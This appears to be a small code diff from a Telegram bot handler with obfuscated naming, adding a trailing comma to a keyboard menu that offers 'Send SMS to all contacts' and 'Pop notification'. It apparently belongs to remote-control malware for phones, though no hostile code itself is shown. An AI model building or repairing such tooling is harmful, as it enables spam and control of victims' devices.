@@ -349,7 +349,7 @@ bot.on("message", _0xdbde0c => {
                                         ["✯ Send SMS to all contacts ✯"],
                                         ["✯ Pop notification ✯"],
                                         ["✯ Back to main menu ✯"]
-                                        ]
+                                        ],
                                   'resize_keyboard': true,
                                   'one_time_keyboard': true
                                 }
